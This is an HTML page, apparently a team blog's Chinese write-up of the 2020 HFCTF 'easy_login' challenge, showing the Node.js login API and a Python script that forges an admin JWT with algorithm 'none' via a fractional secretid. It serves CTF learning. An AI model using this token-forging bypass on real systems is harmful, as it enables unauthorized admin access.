@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/48x48.png">
+  <link rel="icon" type="image/png" sizes="64x64" href="/images/48x48.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/48x48.png">
+  <link rel="mask-icon" href="/images/logo1.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"boiteam.github.io","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="先扫一下目录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020 虎符网络安全大赛   easy_login">
+<meta property="og:url" content="https://boiteam.github.io/2020/04/19/2020_HFCTF_easy_login/index.html">
+<meta property="og:site_name" content="BOI Team">
+<meta property="og:description" content="先扫一下目录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200419190749624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020041919290348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200419193921882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200419194154665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200419194326392.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200419194530451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200419194700353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-04-19T05:54:17.000Z">
+<meta property="article:modified_time" content="2020-04-19T12:58:57.583Z">
+<meta property="article:author" content="BOI Team">
+<meta property="article:tag" content="Web_JWT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200419190749624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70">
+
+<link rel="canonical" href="https://boiteam.github.io/2020/04/19/2020_HFCTF_easy_login/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>2020 虎符网络安全大赛   easy_login | BOI Team</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="BOI Team" type="application/atom+xml">
+</head>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BOI Team</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://boiteam.github.io/2020/04/19/2020_HFCTF_easy_login/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="BOI Team">
+      <meta itemprop="description" content="Because Of Interest">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOI Team">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020 虎符网络安全大赛   easy_login
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-04-19 13:54:17 / 修改时间：20:58:57" itemprop="dateCreated datePublished" datetime="2020-04-19T13:54:17+08:00">2020-04-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web/JS/" itemprop="url" rel="index"><span itemprop="name">JS</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>先扫一下目录</p>
+<img src="https://img-blog.csdnimg.cn/20200419190749624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" style="zoom:80%;">
+
+
+
+<p>首先这是一个<code>koa</code>框架，所以我们先熟悉一下这个框架的目录结构</p>
+<p><img src="https://img-blog.csdnimg.cn/2020041919290348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后访问<code>/controllers/api.js</code>得到逻辑代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">'../rest'</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">'POST /api/register'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'register error'</span>, <span class="string">'wrong username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(global.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    <span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/flag'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'permission error'</span>, <span class="string">'permission denied'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">'/flag'</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/logout'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+<p>这儿的大致意思就是注册登录，并把信息保存在<code>jwt</code>中，一般jwt是可以伪造的，但是这儿密码我们根本不可能爆破出来</p>
+<p>所以只能寻求其它的方法，我们注意到，我们每一次登录，都会生成密匙并插入到列表当中，然后登录的时候根据<code>sid</code>来选择对应的密匙<br>值得注意的是，我们这儿的sid可控，假如我们令<code>sid=0.1</code>会怎么样呢？<br>这个就是<code>node</code>的<code>jwt</code>漏洞<br>当<code>jwt secret</code>为空时 <code>jsonwebtoken</code>会采用<code>algorithm none</code>进行解密 </p>
+<br>
+<br>
+
+<h5 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h5><p>登录的时候会返回<code>sses:aok</code>，里面包含我们的登录信息，这个我们可以更改（改登录名）</p>
+<p><img src="https://img-blog.csdnimg.cn/20200419193921882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们先解密一下注册时返回的jwt<br><a href="https://www.jsonwebtoken.io/" target="_blank" rel="noopener">链接</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20200419194154665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>然后我们进行伪造jwt</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;<span class="string">"secretid"</span>:<span class="number">0.1</span>,<span class="string">"username"</span>: <span class="string">"admin"</span>,<span class="string">"password"</span>: <span class="string">"xxx"</span>,<span class="string">"iat"</span>: <span class="number">1587287370</span>&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://img-blog.csdnimg.cn/20200419194326392.png" alt="在这里插入图片描述"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6MC4xLCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJ4eHgiLCJpYXQiOjE1ODcyODczNzB9.</code></p>
+<p>  <img src="https://img-blog.csdnimg.cn/20200419194530451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  用户名，密码，jwt必须相对应<br>然后记住返回的页面中的<code>sses:aok</code>和<code>sses:aok.sig</code></p>
+</li>
+</ul>
+<p>​    </p>
+<ul>
+<li>进入flag页面<br><img src="https://img-blog.csdnimg.cn/20200419194700353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这两个值都进行替换（登录页面返回的值），就能得到<code>flag</code></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Web-JWT/" rel="tag"><i class="fa fa-tag"></i> Web_JWT</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/19/2020%20%E8%99%8E%E7%AC%A6CTF%20Count/" rel="prev" title="2020 虎符CTF Count">
+      <i class="fa fa-chevron-left"></i> 2020 虎符CTF Count
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/19/2020_HFCTF_just_escape/" rel="next" title="2020 虎符网络安全大赛  just_escape">
+      2020 虎符网络安全大赛  just_escape <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#解题步骤"><span class="nav-number">1.</span> <span class="nav-text">解题步骤</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="BOI Team"
+      src="/images/header.png">
+  <p class="site-author-name" itemprop="name">BOI Team</p>
+  <div class="site-description" itemprop="description">Because Of Interest</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">45</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/BOITeam" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BOITeam" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+      <!--<script src="https://cdn.staticfile.org/jquery/3.1.1/jquery.min.js"></script>
+<script>
+    var div = $('.post-body');
+    var toc=$('.post-toc')
+    function password() {
+        if(''){
+            div.remove();
+            toc.remove();
+            $('.post-header').after(
+            '<span class="description" value="password" style="font-style: normal;font-weight: bold;border: none;display: block;'+
+            'width: 60%;margin: 0 auto;text-align: center;outline: none;margin-bottom: 40px;resize:none ">'+
+            'Private Articles' +
+            '</span>' +
+            '<div class="qiang" style="height: 100px;width: 60%;margin:0 auto">' +
+            '<input class="password"  type="password" autocomplete="new-password" autofocus="autofocus" value="" style="border-radius: 5px;height: 30px;border: none;display: block;border-bottom: 1px solid #ccc;' +
+            'margin: 0 auto;outline: none;width:95%"/>' +
+            '</div>')
+            //绑定点击事件，如果是点击的.password 这个div就改变样式，如果是document中除了div之外的其他任何元素，就变回原来的样式。
+            document.onclick = function (event) {
+                var e = event || window.event;
+                var elem = e.srcElement || e.target;
+
+                while (elem) {
+                    if (elem != document) {
+                        if (elem.className == "password") {
+                            //$(".password").animate({paddingTop:"30px",width:"100%",borderWidth:"2px"},300)
+                            return;
+                        }
+                        elem = elem.parentNode;
+                    } else {
+                        //$(".password").animate({paddingTop:"0px",width:"95%",borderWidth:"1px"},300)
+                        return;
+                    }
+                }
+            }
+
+            $(document).keyup(function(event){
+                if(event.keyCode ==13&&$('.password').length>0){
+                    //console.log($('.password').val())
+                    //console.log('')
+                    if ($('.password').val() == '') {
+                        //恢复文章内容
+                        (div).appendTo($(".post-header"))
+                        //恢复目录
+                        toc.appendTo($(".sidebar-inner"))
+                        //删除本页面的输入密码组件
+                        $(".description").remove();
+                        $(".qiang").remove();
+                        $(".password").remove();
+
+                        $('img').lazyload({
+                            placeholder: '/images/loading.gif',
+                            effect: 'fadeIn',
+                            threshold : 100,
+                            failure_limit : 20,
+                            skip_invisible : false
+                        });
+                        $(".post-block").css({opacity:1});
+                        $(".post-header").css({opacity:1});
+                        $(".post-body").css({opacity:1});
+                        $(".pagination").css({opacity:1});
+                    }else {
+                        alert("Error Password")
+                    }
+                }
+            });
+        }
+    }
+    password();
+</script>-->
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BOI Team</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">60k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
